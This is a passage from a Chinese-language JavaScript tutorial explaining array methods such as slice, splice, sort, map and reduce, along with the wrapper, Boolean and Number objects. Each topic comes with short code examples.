   .. code:: javascript

      [1, 2, 3].concat(4, 5, 6)
      // [1, 2, 3, 4, 5, 6]

   如果数组成员包括对象， ``concat`` 方法返回当前数组的一个浅拷贝。所谓“浅拷贝”，指的是新数组拷贝的是对象的引用。

   .. code:: javascript

      var obj = { a: 1 };
      var oldArray = [obj];
   
      var newArray = oldArray.concat();
   
      obj.a = 2;
      newArray[0].a // 2

   上面代码中，原数组包含一个对象， ``concat`` 方法生成的新数组包含这个对象的引用。所以，改变原对象以后，新数组跟着改变。

reverse()
~~~~~~~~~~

    ``reverse`` 方法用于颠倒排列数组元素，返回改变后的数组。注意，该方法将改变原数组。

   .. code:: javascript

      var a = ['a', 'b', 'c'];
   
      a.reverse() // ["c", "b", "a"]
      a // ["c", "b", "a"]

slice()
~~~~~~~~

    ``slice()`` 方法用于提取目标数组的一部分，返回一个新数组，原数组不变。

   .. code:: javascript

      arr.slice(start, end);

   它的第一个参数为起始位置（从0开始，会包括在返回的新数组之中），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。

   .. code:: javascript

      var a = ['a', 'b', 'c'];
   
      a.slice(0) // ["a", "b", "c"]
      a.slice(1) // ["b", "c"]
      a.slice(1, 2) // ["b"]
      a.slice(2, 6) // ["c"]
      a.slice() // ["a", "b", "c"]

   上面代码中，最后一个例子 ``slice()`` 没有参数，实际上等于返回一个原数组的拷贝。

   如果 ``slice()`` 方法的参数是负数，则表示倒数计算的位置。

   .. code:: javascript

      var a = ['a', 'b', 'c'];
      a.slice(-2) // ["b", "c"]
      a.slice(-2, -1) // ["b"]

   上面代码中， ``-2`` 表示倒数计算的第二个位置， ``-1`` 表示倒数计算的第一个位置。

   如果第一个参数大于等于数组长度，或者第二个参数小于第一个参数，则返回空数组。

   .. code:: javascript

      var a = ['a', 'b', 'c'];
      a.slice(4) // []
      a.slice(2, 1) // []

    ``slice()`` 方法的一个重要应用，是将类似数组的对象转为真正的数组。

   .. code:: javascript

      Array.prototype.slice.call({ 0: 'a', 1: 'b', length: 2 })
      // ['a', 'b']
   
      Array.prototype.slice.call(document.querySelectorAll("div"));
      Array.prototype.slice.call(arguments);

   上面代码的参数都不是数组，但是通过 ``call`` 方法，在它们上面调用 ``slice()`` 方法，就可以把它们转为真正的数组。

splice()
~~~~~~~~~

    ``splice()`` 方法用于删除原数组的一部分成员，并可以在删除的位置添加新的数组成员，返回值是被删除的元素。注意，该方法会改变原数组。

   .. code:: javascript

      arr.splice(start, count, addElement1, addElement2, ...);

    ``splice`` 的第一个参数是删除的起始位置（从0开始），第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。

   .. code:: javascript

      var a = ['a', 'b', 'c', 'd', 'e', 'f'];
      a.splice(4, 2) // ["e", "f"]
      a // ["a", "b", "c", "d"]

   上面代码从原数组4号位置，删除了两个数组成员。

   .. code:: javascript

      var a = ['a', 'b', 'c', 'd', 'e', 'f'];
      a.splice(4, 2, 1, 2) // ["e", "f"]
      a // ["a", "b", "c", "d", 1, 2]

   上面代码除了删除成员，还插入了两个新成员。

   起始位置如果是负数，就表示从倒数位置开始删除。

   .. code:: javascript

      var a = ['a', 'b', 'c', 'd', 'e', 'f'];
      a.splice(-4, 2) // ["c", "d"]

   上面代码表示，从倒数第四个位置 ``c`` 开始删除两个成员。

   如果只是单纯地插入元素， ``splice`` 方法的第二个参数可以设为 ``0`` 。

   .. code:: javascript

      var a = [1, 1, 1];
   
      a.splice(1, 0, 2) // []
      a // [1, 2, 1, 1]

   如果只提供第一个参数，等同于将原数组在指定位置拆分成两个数组。

   .. code:: javascript

      var a = [1, 2, 3, 4];
      a.splice(2) // [3, 4]
      a // [1, 2]

sort()
~~~~~~~

    ``sort`` 方法对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。

   .. code:: javascript

      ['d', 'c', 'b', 'a'].sort()
      // ['a', 'b', 'c', 'd']
   
      [4, 3, 2, 1].sort()
      // [1, 2, 3, 4]
   
      [11, 101].sort()
      // [101, 11]
   
      [10111, 1101, 111].sort()
      // [10111, 1101, 111]

   上面代码的最后两个例子，需要特殊注意。 ``sort()`` 方法不是按照大小排序，而是按照字典顺序。也就是说，数值会被先转成字符串，再按照字典顺序进行比较，所以 ``101`` 排在 ``11`` 的前面。

   如果想让 ``sort`` 方法按照自定义方式排序，可以传入一个函数作为参数。

   .. code:: javascript

      [10111, 1101, 111].sort(function (a, b) {
        return a - b;
      })
      // [111, 1101, 10111]

   上面代码中， ``sort`` 的参数函数本身接受两个参数，表示进行比较的两个数组成员。如果该函数的返回值大于 ``0`` ，表示第一个成员排在第二个成员后面；其他情况下，都是第一个元素排在第二个元素前面。

   .. code:: javascript

      [
        { name: "张三", age: 30 },
        { name: "李四", age: 24 },
        { name: "王五", age: 28  }
      ].sort(function (o1, o2) {
        return o1.age - o2.age;
      })
      // [
      //   { name: "李四", age: 24 },
      //   { name: "王五", age: 28  },
      //   { name: "张三", age: 30 }
      // ]

   注意，自定义的排序函数应该返回数值，否则不同的浏览器可能有不同的实现，不能保证结果都一致。

   .. code:: javascript

      // bad
      [1, 4, 2, 6, 0, 6, 2, 6].sort((a, b) => a > b)
   
      // good
      [1, 4, 2, 6, 0, 6, 2, 6].sort((a, b) => a - b)

   上面代码中，前一种排序算法返回的是布尔值，这是不推荐使用的。后一种是数值，才是更好的写法。

map()
~~~~~~

    ``map()`` 方法将数组的所有成员依次传入参数函数，然后把每一次的执行结果组成一个新数组返回。

   .. code:: javascript

      var numbers = [1, 2, 3];
   
      numbers.map(function (n) {
        return n + 1;
      });
      // [2, 3, 4]
   
      numbers
      // [1, 2, 3]

   上面代码中， ``numbers`` 数组的所有成员依次执行参数函数，运行结果组成一个新数组返回，原数组没有变化。

    ``map()`` 方法接受一个函数作为参数。该函数调用时， ``map()`` 方法向它传入三个参数：当前成员、当前位置和数组本身。

   .. code:: javascript

      [1, 2, 3].map(function(elem, index, arr) {
        return elem * index;
      });
      // [0, 2, 6]

   上面代码中， ``map()`` 方法的回调函数有三个参数， ``elem`` 为当前成员的值， ``index`` 为当前成员的位置， ``arr`` 为原数组（ ``[1, 2, 3]`` ）。

    ``map()`` 方法还可以接受第二个参数，用来绑定回调函数内部的 ``this`` 变量（详见《this 变量》一章）。

   .. code:: javascript

      var arr = ['a', 'b', 'c'];
   
      [1, 2].map(function (e) {
        return this[e];
      }, arr)
      // ['b', 'c']

   上面代码通过 ``map()`` 方法的第二个参数，将回调函数内部的 ``this`` 对象，指向 ``arr`` 数组。

   如果数组有空位， ``map()`` 方法的回调函数在这个位置不会执行，会跳过数组的空位。

   .. code:: javascript

      var f = function (n) { return 'a' };
   
      [1, undefined, 2].map(f) // ["a", "a", "a"]
      [1, null, 2].map(f) // ["a", "a", "a"]
      [1, , 2].map(f) // ["a", , "a"]

   上面代码中， ``map()`` 方法不会跳过 ``undefined`` 和 ``null`` ，但是会跳过空位。

forEach()
~~~~~~~~~~

    ``forEach()`` 方法与 ``map()`` 方法很相似，也是对数组的所有成员依次执行参数函数。但是， ``forEach()`` 方法不返回值，只用来操作数据。这就是说，如果数组遍历的目的是为了得到返回值，那么使用 ``map()`` 方法，否则使用 ``forEach()`` 方法。

    ``forEach()`` 的用法与 ``map()`` 方法一致，参数是一个函数，该函数同样接受三个参数：当前值、当前位置、整个数组。

   .. code:: javascript

      function log(element, index, array) {
        console.log('[' + index + '] = ' + element);
      }
   
      [2, 5, 9].forEach(log);
      // [0] = 2
      // [1] = 5
      // [2] = 9

   上面代码中， ``forEach()`` 遍历数组不是为了得到返回值，而是为了在屏幕输出内容，所以不必使用 ``map()`` 方法。

    ``forEach()`` 方法也可以接受第二个参数，绑定参数函数的 ``this`` 变量。

   .. code:: javascript

      var out = [];
   
      [1, 2, 3].forEach(function(elem) {
        this.push(elem * elem);
      }, out);
   
      out // [1, 4, 9]

   上面代码中，空数组 ``out`` 是 ``forEach()`` 方法的第二个参数，结果，回调函数内部的 ``this`` 关键字就指向 ``out`` 。

   注意， ``forEach()`` 方法无法中断执行，总是会将所有成员遍历完。如果希望符合某种条件时，就中断遍历，要使用 ``for`` 循环。

   .. code:: javascript

      var arr = [1, 2, 3];
   
      for (var i = 0; i < arr.length; i++) {
        if (arr[i] === 2) break;
        console.log(arr[i]);
      }
      // 1

   上面代码中，执行到数组的第二个成员时，就会中断执行。 ``forEach()`` 方法做不到这一点。

    ``forEach()`` 方法也会跳过数组的空位。

   .. code:: javascript

      var log = function (n) {
        console.log(n + 1);
      };
   
      [1, undefined, 2].forEach(log)
      // 2
      // NaN
      // 3
   
      [1, null, 2].forEach(log)
      // 2
      // 1
      // 3
   
      [1, , 2].forEach(log)
      // 2
      // 3

   上面代码中， ``forEach()`` 方法不会跳过 ``undefined`` 和 ``null`` ，但会跳过空位。

filter()
~~~~~~~~~

    ``filter()`` 方法用于过滤数组成员，满足条件的成员组成一个新数组返回。

   它的参数是一个函数，所有数组成员依次执行该函数，返回结果为 ``true`` 的成员组成一个新数组返回。该方法不会改变原数组。

   .. code:: javascript

      [1, 2, 3, 4, 5].filter(function (elem) {
        return (elem > 3);
      })
      // [4, 5]

   上面代码将大于 ``3`` 的数组成员，作为一个新数组返回。

   .. code:: javascript

      var arr = [0, 1, 'a', false];
   
      arr.filter(Boolean)
      // [1, "a"]

   上面代码中， ``filter()`` 方法返回数组 ``arr`` 里面所有布尔值为 ``true`` 的成员。

    ``filter()`` 方法的参数函数可以接受三个参数：当前成员，当前位置和整个数组。

   .. code:: javascript

      [1, 2, 3, 4, 5].filter(function (elem, index, arr) {
        return index % 2 === 0;
      });
      // [1, 3, 5]

   上面代码返回偶数位置的成员组成的新数组。

    ``filter()`` 方法还可以接受第二个参数，用来绑定参数函数内部的 ``this`` 变量。

   .. code:: javascript

      var obj = { MAX: 3 };
      var myFilter = function (item) {
        if (item > this.MAX) return true;
      };
   
      var arr = [2, 8, 3, 4, 1, 3, 2, 9];
      arr.filter(myFilter, obj) // [8, 4, 9]

   上面代码中，过滤器 ``myFilter()`` 内部有 ``this`` 变量，它可以被 ``filter()`` 方法的第二个参数 ``obj`` 绑定，返回大于 ``3`` 的成员。

some()，every()
~~~~~~~~~~~~~~~

   这两个方法类似“断言”（assert），返回一个布尔值，表示判断数组成员是否符合某种条件。

   它们接受一个函数作为参数，所有数组成员依次执行该函数。该函数接受三个参数：当前成员、当前位置和整个数组，然后返回一个布尔值。

    ``some`` 方法是只要一个成员的返回值是 ``true`` ，则整个 ``some`` 方法的返回值就是 ``true`` ，否则返回 ``false`` 。

   .. code:: javascript

      var arr = [1, 2, 3, 4, 5];
      arr.some(function (elem, index, arr) {
        return elem >= 3;
      });
      // true

   上面代码中，如果数组 ``arr`` 有一个成员大于等于3， ``some`` 方法就返回 ``true`` 。

    ``every`` 方法是所有成员的返回值都是 ``true`` ，整个 ``every`` 方法才返回 ``true`` ，否则返回 ``false`` 。

   .. code:: javascript

      var arr = [1, 2, 3, 4, 5];
      arr.every(function (elem, index, arr) {
        return elem >= 3;
      });
      // false

   上面代码中，数组 ``arr`` 并非所有成员大于等于 ``3`` ，所以返回 ``false`` 。

   注意，对于空数组， ``some`` 方法返回 ``false`` ， ``every`` 方法返回 ``true`` ，回调函数都不会执行。

   .. code:: javascript

      function isEven(x) { return x % 2 === 0 }
   
      [].some(isEven) // false
      [].every(isEven) // true

    ``some`` 和 ``every`` 方法还可以接受第二个参数，用来绑定参数函数内部的 ``this`` 变量。

reduce()，reduceRight()
~~~~~~~~~~~~~~~~~~~~~~~

    ``reduce()`` 方法和 ``reduceRight()`` 方法依次处理数组的每个成员，最终累计为一个值。它们的差别是， ``reduce()`` 是从左到右处理（从第一个成员到最后一个成员）， ``reduceRight()`` 则是从右到左（从最后一个成员到第一个成员），其他完全一样。

   .. code:: javascript

      [1, 2, 3, 4, 5].reduce(function (a, b) {
        console.log(a, b);
        return a + b;
      })
      // 1 2
      // 3 3
      // 6 4
      // 10 5
      //最后结果：15

   上面代码中， ``reduce()`` 方法用来求出数组所有成员的和。 ``reduce()`` 的参数是一个函数，数组每个成员都会依次执行这个函数。如果数组有 n 个成员，这个参数函数就会执行 n - 1 次。

   - 第一次执行： ``a`` 是数组的第一个成员 ``1`` ， ``b`` 是数组的第二个成员 ``2`` 。
   - 第二次执行： ``a`` 为上一轮的返回值 ``3`` ， ``b`` 为第三个成员 ``3`` 。
   - 第三次执行： ``a`` 为上一轮的返回值 ``6`` ， ``b`` 为第四个成员 ``4`` 。
   - 第四次执行： ``a`` 为上一轮返回值 ``10`` ， ``b`` 为第五个成员 ``5`` 。至此所有成员遍历完成，整个方法的返回值就是最后一轮的返回值 ``15`` 。

    ``reduce()`` 方法和 ``reduceRight()`` 方法的第一个参数都是一个函数。该函数接受以下四个参数。

   1. 累积变量。第一次执行时，默认为数组的第一个成员；以后每次执行时，都是上一轮的返回值。
   2. 当前变量。第一次执行时，默认为数组的第二个成员；以后每次执行时，都是下一个成员。
   3. 当前位置。一个整数，表示第二个参数（当前变量）的位置，默认为 ``1`` 。
   4. 原数组。

   这四个参数之中，只有前两个是必须的，后两个则是可选的。

   .. code:: javascript

      [1, 2, 3, 4, 5].reduce(function (
        a,   // 累积变量，必须
        b,   // 当前变量，必须
        i,   // 当前位置，可选
        arr  // 原数组，可选
      ) {
        // ... ...

   如果要对累积变量指定初值，可以把它放在 ``reduce()`` 方法和 ``reduceRight()`` 方法的第二个参数。

   .. code:: javascript

      [1, 2, 3, 4, 5].reduce(function (a, b) {
        return a + b;
      }, 10);
      // 25

   上面代码指定参数 ``a`` 的初值为10，所以数组从10开始累加，最终结果为25。注意，这时 ``b`` 是从数组的第一个成员开始遍历，参数函数会执行5次。

   建议总是加上第二个参数，这样比较符合直觉，每个数组成员都会依次执行 ``reduce()`` 方法的参数函数。另外，第二个参数可以防止空数组报错。

   .. code:: javascript

      function add(prev, cur) {
        return prev + cur;
      }
   
      [].reduce(add)
      // TypeError: Reduce of empty array with no initial value
      [].reduce(add, 1)
      // 1

   上面代码中，由于空数组取不到累积变量的初始值， ``reduce()`` 方法会报错。这时，加上第二个参数，就能保证总是会返回一个值。

   下面是一个 ``reduceRight()`` 方法的例子。

   .. code:: javascript

      function subtract(prev, cur) {
        return prev - cur;
      }
   
      [3, 2, 1].reduce(subtract) // 0
      [3, 2, 1].reduceRight(subtract) // -4

   上面代码中， ``reduce()`` 方法相当于 ``3`` 减去 ``2`` 再减去 ``1`` ， ``reduceRight`` 方法相当于 ``1`` 减去 ``2`` 再减去 ``3`` 。

   由于这两个方法会遍历数组，所以实际上可以用来做一些遍历相关的操作。比如，找出字符长度最长的数组成员。

   .. code:: javascript

      function findLongest(entries) {
        return entries.reduce(function (longest, entry) {
          return entry.length > longest.length ? entry : longest;
        }, '');
      }
   
      findLongest(['aaa', 'bb', 'c']) // "aaa"

   上面代码中， ``reduce()`` 的参数函数会将字符长度较长的那个数组成员，作为累积值。这导致遍历所有成员之后，累积值就是字符长度最长的那个成员。

indexOf()，lastIndexOf()
~~~~~~~~~~~~~~~~~~~~~~~~

    ``indexOf`` 方法返回给定元素在数组中第一次出现的位置，如果没有出现则返回 ``-1`` 。

   .. code:: javascript

      var a = ['a', 'b', 'c'];
   
      a.indexOf('b') // 1
      a.indexOf('y') // -1

    ``indexOf`` 方法还可以接受第二个参数，表示搜索的开始位置。

   .. code:: javascript

      ['a', 'b', 'c'].indexOf('a', 1) // -1

   上面代码从1号位置开始搜索字符 ``a`` ，结果为 ``-1`` ，表示没有搜索到。

    ``lastIndexOf`` 方法返回给定元素在数组中最后一次出现的位置，如果没有出现则返回 ``-1`` 。

   .. code:: javascript

      var a = [2, 5, 9, 2];
      a.lastIndexOf(2) // 3
      a.lastIndexOf(7) // -1

   注意，这两个方法不能用来搜索 ``NaN`` 的位置，即它们无法确定数组成员是否包含 ``NaN`` 。

   .. code:: javascript

      [NaN].indexOf(NaN) // -1
      [NaN].lastIndexOf(NaN) // -1

   这是因为这两个方法内部，使用严格相等运算符（ ``===`` ）进行比较，而 ``NaN`` 是唯一一个不等于自身的值。

链式使用
~~~~~~~

   上面这些数组方法之中，有不少返回的还是数组，所以可以链式使用。

   .. code:: javascript

      var users = [
        {name: 'tom', email: 'tom@example.com'},
        {name: 'peter', email: 'peter@example.com'}
      ];
   
      users
      .map(function (user) {
        return user.email;
      })
      .filter(function (email) {
        return /^t/.test(email);
      })
      .forEach(function (email) {
        console.log(email);
      });
      // "tom@example.com"

   上面代码中，先产生一个所有 Email 地址组成的数组，然后再过滤出以 ``t`` 开头的 Email 地址，最后将它打印出来。

参考链接
-------

   - Nicolas Bevacqua, [Fun with JavaScript Native Array Functions](http://flippinawesome.org/2013/11/25/fun-with-javascript-native-array-functions/)

/🟠 包装对象
===========

定义
---

   对象是 JavaScript 语言最主要的数据类型，三种原始类型的值——数值、字符串、布尔值——在一定条件下，也会自动转为对象，也就是原始类型的“包装对象”（wrapper）。

   所谓“包装对象”，指的是与数值、字符串、布尔值分别相对应的 ``Number`` 、 ``String`` 、 ``Boolean`` 三个原生对象。这三个原生对象可以把原始类型的值变成（包装成）对象。

   .. code:: javascript

      var v1 = new Number(123);
      var v2 = new String('abc');
      var v3 = new Boolean(true);
   
      typeof v1 // "object"
      typeof v2 // "object"
      typeof v3 // "object"
   
      v1 === 123 // false
      v2 === 'abc' // false
      v3 === true // false

   上面代码中，基于原始类型的值，生成了三个对应的包装对象。可以看到， ``v1`` 、 ``v2`` 、 ``v3`` 都是对象，且与对应的简单类型值不相等。

   包装对象的设计目的，首先是使得“对象”这种类型可以覆盖 JavaScript 所有的值，整门语言有一个通用的数据模型，其次是使得原始类型的值也有办法调用自己的方法。

    ``Number`` 、 ``String`` 和 ``Boolean`` 这三个原生对象，如果不作为构造函数调用（即调用时不加 ``new`` ），而是作为普通函数调用，常常用于将任意类型的值转为数值、字符串和布尔值。

   .. code:: javascript

      // 字符串转为数值
      Number('123') // 123
   
      // 数值转为字符串
      String(123) // "123"
   
      // 数值转为布尔值
      Boolean(123) // true

   上面这种数据类型的转换，详见《数据类型转换》一节。

   总结一下，这三个对象作为构造函数使用（带有 ``new`` ）时，可以将原始类型的值转为对象；作为普通函数使用时（不带有 ``new`` ），可以将任意类型的值，转为原始类型的值。

实例方法
-------

   三种包装对象各自提供了许多实例方法，详见后文。这里介绍两种它们共同具有、从 ``Object`` 对象继承的方法： ``valueOf()`` 和 ``toString()`` 。

valueOf()
~~~~~~~~~~

    ``valueOf()`` 方法返回包装对象实例对应的原始类型的值。

   .. code:: javascript

      new Number(123).valueOf()  // 123
      new String('abc').valueOf() // "abc"
      new Boolean(true).valueOf() // true

toString()
~~~~~~~~~~~

    ``toString()`` 方法返回对应的字符串形式。

   .. code:: javascript

      new Number(123).toString() // "123"
      new String('abc').toString() // "abc"
      new Boolean(true).toString() // "true"

原始类型与实例对象的自动转换
-----------------------

   某些场合，原始类型的值会自动当作包装对象调用，即调用包装对象的属性和方法。这时，JavaScript 引擎会自动将原始类型的值转为包装对象实例，并在使用后立刻销毁实例。

   比如，字符串可以调用 ``length`` 属性，返回字符串的长度。

   .. code:: javascript

      'abc'.length // 3

   上面代码中， ``abc`` 是一个字符串，本身不是对象，不能调用 ``length`` 属性。JavaScript 引擎自动将其转为包装对象，在这个对象上调用 ``length`` 属性。调用结束后，这个临时对象就会被销毁。这就叫原始类型与实例对象的自动转换。

   .. code:: javascript

      var str = 'abc';
      str.length // 3
   
      // 等同于
      var strObj = new String(str)
      // String {
      //   0: "a", 1: "b", 2: "c", length: 3, [[PrimitiveValue]]: "abc"
      // }
      strObj.length // 3

   上面代码中，字符串 ``abc`` 的包装对象提供了多个属性， ``length`` 只是其中之一。

   自动转换生成的包装对象是只读的，无法修改。所以，字符串无法添加新属性。

   .. code:: javascript

      var s = 'Hello World';
      s.x = 123;
      s.x // undefined

   上面代码为字符串 ``s`` 添加了一个 ``x`` 属性，结果无效，总是返回 ``undefined`` 。

   另一方面，调用结束后，包装对象实例会自动销毁。这意味着，下一次调用字符串的属性时，实际是调用一个新生成的对象，而不是上一次调用时生成的那个对象，所以取不到赋值在上一个对象的属性。如果要为字符串添加属性，只有在它的原型对象 ``String.prototype`` 上定义（参见《面向对象编程》章节）。

自定义方法
--------

   除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用。

   比如，我们可以新增一个 ``double`` 方法，使得字符串和数字翻倍。

   .. code:: javascript

      String.prototype.double = function () {
        return this.valueOf() + this.valueOf();
      };
   
      'abc'.double()
      // abcabc
   
      Number.prototype.double = function () {
        return this.valueOf() + this.valueOf();
      };
   
      (123).double() // 246

   上面代码在 ``String`` 和 ``Number`` 这两个对象的原型上面，分别自定义了一个方法，从而可以在所有实例对象上调用。注意，最后一行的 ``123`` 外面必须要加上圆括号，否则后面的点运算符（ ``.`` ）会被解释成小数点。

/🟠 Boolean 对象
================


概述
---

    ``Boolean`` 对象是 JavaScript 的三个包装对象之一。作为构造函数，它主要用于生成布尔值的包装对象实例。

   .. code:: javascript

      var b = new Boolean(true);
   
      typeof b // "object"
      b.valueOf() // true

   上面代码的变量 ``b`` 是一个 ``Boolean`` 对象的实例，它的类型是对象，值为布尔值 ``true`` 。

   注意， ``false`` 对应的包装对象实例，布尔运算结果也是 ``true`` 。

   .. code:: javascript

      if (new Boolean(false)) {
        console.log('true');
      } // true
   
      if (new Boolean(false).valueOf()) {
        console.log('true');
      } // 无输出

   上面代码的第一个例子之所以得到 ``true`` ，是因为 ``false`` 对应的包装对象实例是一个对象，进行逻辑运算时，被自动转化成布尔值 ``true`` （因为所有对象对应的布尔值都是 ``true`` ）。而实例的 ``valueOf`` 方法，则返回实例对应的原始值，本例为 ``false`` 。

Boolean 函数的类型转换作用
-----------------------

    ``Boolean`` 对象除了可以作为构造函数，还可以单独使用，将任意值转为布尔值。这时 ``Boolean`` 就是一个单纯的工具方法。

   .. code:: javascript

      Boolean(undefined) // false
      Boolean(null) // false
      Boolean(0) // false
      Boolean('') // false
      Boolean(NaN) // false
   
      Boolean(1) // true
      Boolean('false') // true
      Boolean([]) // true
      Boolean({}) // true
      Boolean(function () {}) // true
      Boolean(/foo/) // true

   上面代码中几种得到 ``true`` 的情况，都值得认真记住。

   顺便提一下，使用双重的否运算符（ ``!`` ）也可以将任意值转为对应的布尔值。

   .. code:: javascript

      !!undefined // false
      !!null // false
      !!0 // false
      !!'' // false
      !!NaN // false
   
      !!1 // true
      !!'false' // true
      !![] // true
      !!{} // true
      !!function(){} // true
      !!/foo/ // true

   最后，对于一些特殊值， ``Boolean`` 对象前面加不加 ``new`` ，会得到完全相反的结果，必须小心。

   .. code:: javascript

      if (Boolean(false)) {
        console.log('true');
      } // 无输出
   
      if (new Boolean(false)) {
        console.log('true');
      } // true
   
      if (Boolean(null)) {
        console.log('true');
      } // 无输出
   
      if (new Boolean(null)) {
        console.log('true');
      } // true

/🟠 Number 对象
===============

概述
---

    ``Number`` 对象是数值对应的包装对象，可以作为构造函数使用，也可以作为工具函数使用。

   作为构造函数时，它用于生成值为数值的对象。

   .. code:: javascript

      var n = new Number(1);
      typeof n // "object"

   上面代码中， ``Number`` 对象作为构造函数使用，返回一个值为 ``1`` 的对象。

   作为工具函数时，它可以将任何类型的值转为数值。

   .. code:: javascript

      Number(true) // 1

   上面代码将布尔值 ``true`` 转为数值 ``1`` 。 ``Number`` 作为工具函数的用法，详见《数据类型转换》一章。

静态属性
-------

    ``Number`` 对象拥有以下一些静态属性（即直接定义在 ``Number`` 对象上的属性，而不是定义在实例上的属性）。

   -  ``Number.POSITIVE_INFINITY`` ：正的无限，指向 ``Infinity`` 。
   -  ``Number.NEGATIVE_INFINITY`` ：负的无限，指向 ``-Infinity`` 。
   -  ``Number.NaN`` ：表示非数值，指向 ``NaN`` 。
   -  ``Number.MIN_VALUE`` ：表示最小的正数（即最接近0的正数，在64位浮点数体系中为 ``5e-324`` ），相应的，最接近0的负数为 ``-Number.MIN_VALUE`` 。
   -  ``Number.MAX_SAFE_INTEGER`` ：表示能够精确表示的最大整数，即 ``9007199254740991`` 。
   -  ``Number.MIN_SAFE_INTEGER`` ：表示能够精确表示的最小整数，即 ``-9007199254740991`` 。

   .. code:: javascript

      Number.POSITIVE_INFINITY // Infinity
      Number.NEGATIVE_INFINITY // -Infinity
      Number.NaN // NaN
   
      Number.MAX_VALUE
      // 1.7976931348623157e+308
      Number.MAX_VALUE < Infinity
      // true
   
      Number.MIN_VALUE
      // 5e-324
      Number.MIN_VALUE > 0
      // true
   
      Number.MAX_SAFE_INTEGER // 9007199254740991
      Number.MIN_SAFE_INTEGER // -9007199254740991

实例方法
-------

    ``Number`` 对象有4个实例方法，都跟将数值转换成指定格式有关。

Number.prototype.toString()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Number`` 对象部署了自己的 ``toString`` 方法，用来将一个数值转为字符串形式。

   .. code:: javascript

      (10).toString() // "10"

    ``toString`` 方法可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。

   .. code:: javascript

      (10).toString(2) // "1010"
      (10).toString(8) // "12"
      (10).toString(16) // "a"

   上面代码中， ``10`` 一定要放在括号里，这样表明后面的点表示调用对象属性。如果不加括号，这个点会被 JavaScript 引擎解释成小数点，从而报错。

   .. code:: javascript

      10.toString(2)
      // SyntaxError: Unexpected token ILLEGAL

   只要能够让 JavaScript 引擎不混淆小数点和对象的点运算符，各种写法都能用。除了为 ``10`` 加上括号，还可以在 ``10`` 后面加两个点，JavaScript 会把第一个点理解成小数点（即 ``10.0`` ），把第二个点理解成调用对象属性，从而得到正确结果。

   .. code:: javascript

      10..toString(2)
      // "1010"
   
      // 其他方法还包括
      10 .toString(2) // "1010"
      10.0.toString(2) // "1010"

   这实际上意味着，可以直接对一个小数使用 ``toString`` 方法。

   .. code:: javascript

      10.5.toString() // "10.5"
      10.5.toString(2) // "1010.1"
      10.5.toString(8) // "12.4"
      10.5.toString(16) // "a.8"

   通过方括号运算符也可以调用 ``toString`` 方法。

   .. code:: javascript

      10['toString'](2) // "1010"

    ``toString`` 方法只能将十进制的数，转为其他进制的字符串。如果要将其他进制的数，转回十进制，需要使用 ``parseInt`` 方法。

Number.prototype.toFixed()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``toFixed()`` 方法先将一个数转为指定位数的小数，然后返回这个小数对应的字符串。

   .. code:: javascript

      (10).toFixed(2) // "10.00"
      10.005.toFixed(2) // "10.01"

   上面代码中， ``10`` 和 ``10.005`` 先转成2位小数，然后转成字符串。其中 ``10`` 必须放在括号里，否则后面的点会被处理成小数点。

    ``toFixed()`` 方法的参数为小数位数，有效范围为0到100，超出这个范围将抛出 RangeError 错误。

   由于浮点数的原因，小数 ``5`` 的四舍五入是不确定的，使用的时候必须小心。

   .. code:: javascript

      (10.055).toFixed(2) // 10.05
      (10.005).toFixed(2) // 10.01

Number.prototype.toExponential()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``toExponential`` 方法用于将一个数转为科学计数法形式。

   .. code:: javascript

      (10).toExponential()  // "1e+1"
      (10).toExponential(1) // "1.0e+1"
      (10).toExponential(2) // "1.00e+1"
   
      (1234).toExponential()  // "1.234e+3"
      (1234).toExponential(1) // "1.2e+3"
      (1234).toExponential(2) // "1.23e+3"

    ``toExponential`` 方法的参数是小数点后有效数字的位数，范围为0到100，超出这个范围，会抛出一个 RangeError 错误。

Number.prototype.toPrecision()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Number.prototype.toPrecision()`` 方法用于将一个数转为指定位数的有效数字。

   .. code:: javascript

      (12.34).toPrecision(1) // "1e+1"
      (12.34).toPrecision(2) // "12"
      (12.34).toPrecision(3) // "12.3"
      (12.34).toPrecision(4) // "12.34"
      (12.34).toPrecision(5) // "12.340"

   该方法的参数为有效数字的位数，范围是1到100，超出这个范围会抛出 RangeError 错误。

   该方法用于四舍五入时不太可靠，跟浮点数不是精确储存有关。

   .. code:: javascript

      (12.35).toPrecision(3) // "12.3"
      (12.25).toPrecision(3) // "12.3"
      (12.15).toPrecision(3) // "12.2"
      (12.45).toPrecision(3) // "12.4"

Number.prototype.toLocaleString()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Number.prototype.toLocaleString()`` 方法接受一个地区码作为参数，返回一个字符串，表示当前数字在该地区的当地书写形式。

   .. code:: javascript

      (123).toLocaleString('zh-Hans-CN-u-nu-hanidec')
      // "一二三"

   该方法还可以接受第二个参数配置对象，用来定制指定用途的返回字符串。该对象的 ``style`` 属性指定输出样式，默认值是 ``decimal`` ，表示输出十进制形式。如果值为 ``percent`` ，表示输出百分数。

   .. code:: javascript

      (123).toLocaleString('zh-Hans-CN', { style: 'percent' })
      // "12,300%"

   如果 ``style`` 属性的值为 ``currency`` ，则可以搭配 ``currency`` 属性，输出指定格式的货币字符串形式。

   .. code:: javascript

      (123).toLocaleString('zh-Hans-CN', { style: 'currency', currency: 'CNY' })
      // "￥123.00"
   
      (123).toLocaleString('de-DE', { style: 'currency', currency: 'EUR' })
      // "123,00 €"
   
      (123).toLocaleString('en-US', { style: 'currency', currency: 'USD' })
      // "$123.00"

   如果 ``Number.prototype.toLocaleString()`` 省略了参数，则由浏览器自行决定如何处理，通常会使用操作系统的地区设定。注意，该方法如果使用浏览器不认识的地区码，会抛出一个错误。

   .. code:: javascript

      (123).toLocaleString('123') // 出错

自定义方法
--------

   与其他对象一样， ``Number.prototype`` 对象上面可以自定义方法，被 ``Number`` 的实例继承。

   .. code:: javascript

      Number.prototype.add = function (x) {
        return this + x;
      };
   
      8['add'](2) // 10

